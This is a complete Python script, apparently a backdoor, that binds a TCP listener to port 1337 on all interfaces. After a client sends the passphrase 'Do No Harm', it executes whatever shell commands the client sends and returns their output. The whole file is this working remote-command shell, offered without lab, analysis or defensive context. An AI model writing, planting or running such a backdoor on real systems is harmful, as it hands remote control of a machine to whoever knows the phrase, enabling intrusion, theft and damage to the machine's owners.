#!/bin/python3

import socket
import _thread
import os

# Thread handler
def handler(client_sock, address):
    client_sock.send(b"> ")
    data = client_sock.recv(1024)

    if data.decode() == 'Do No Harm\n':
        while not data.decode() == 'exit\n':
            client_sock.send(b"> ")
            data = client_sock.recv(1024)

            if not data.decode() == 'exit\n':
                resp = os.popen(data.decode()[:-1]).read()
                client_sock.send(bytes(resp, 'utf-8'))

    client_sock.close()

# Set up our server
server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_socket.bind(("0.0.0.0", 1337))
server_socket.listen(10)

# Run the server with threads
while True:
    print("Server listening for connections...")

    client_sock, address = server_socket.accept()
    print("Connection from: " + repr(address))

    _thread.start_new_thread(handler, (client_sock, address))
